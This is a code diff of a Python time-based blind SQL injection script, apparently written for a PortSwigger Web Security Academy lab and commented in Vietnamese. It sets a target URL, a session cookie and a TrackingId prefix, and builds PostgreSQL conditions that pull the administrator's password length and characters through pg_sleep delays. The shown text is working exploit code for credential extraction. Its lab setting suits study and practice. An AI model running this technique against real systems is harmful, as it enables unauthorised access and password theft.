@@ -13,12 +13,13 @@ import requests
 import urllib.parse
 
 # ====== CONFIG ======
-TARGET = "https://0a5700b8047f909b808f30fb0070004c.web-security-academy.net/"  # Trang chủ (hoặc /login cũng được)
-TRACKING_ID_PREFIX = "x"         # phần prefix có sẵn của TrackingId trước khi chèn payload (ví dụ 'x')
-SESSION_COOKIE = "k5lfTffyCfvNmDaWZ9mBP8YMwxD7gCgK"  # thay bằng session hiện tại của bạn
+TARGET = "https://0a8100e90455f60a80bc3005004f0069.web-security-academy.net/"  # Trang chủ (hoặc /login cũng được)
+TRACKING_ID_PREFIX = "DFa8XQ896v06TFx7"         # phần prefix có sẵn của TrackingId trước khi chèn payload (ví dụ 'x')
+SESSION_COOKIE = "phhTDXfgeIRg2nDuTgCEiw9cIMJuVdfI"  # thay bằng session hiện tại của bạn
 DELAY = 5.0                      # số giây pg_sleep
 TIME_THRESHOLD = 4.0             # ngưỡng nhận diện delay (nên < DELAY một chút)
 USER = "administrator"           # user mục tiêu
+TABLE_NAME = "users"             # tên bảng chứa password (nếu khác thì sửa lại trong các hàm điều kiện)
 MAX_RETRY = 3
 VERIFY_TLS = True                # set False nếu lab dùng cert tự ký
 
@@ -77,7 +78,7 @@ def is_true(condition_sql: str) -> bool:
 def cond_length_ge(n: int) -> str:
     # LENGTH(password) >= n cho user
     return (
-        f"EXISTS (SELECT 1 FROM users "
+        f"EXISTS (SELECT 1 FROM {TABLE_NAME} "
         f"WHERE username='{USER}' AND LENGTH(password)>={n})"
     )
 
@@ -85,7 +86,7 @@ def cond_char_code_ge(pos: int, code: int) -> str:
     # ASCII(SUBSTRING(password,pos,1)) >= code
     # PostgreSQL: SUBSTRING(string, start, length)
     return (
-        f"EXISTS (SELECT 1 FROM users "
+        f"EXISTS (SELECT 1 FROM {TABLE_NAME} "
         f"WHERE username='{USER}' AND ASCII(SUBSTRING(password,{pos},1))>={code})"
     )
 
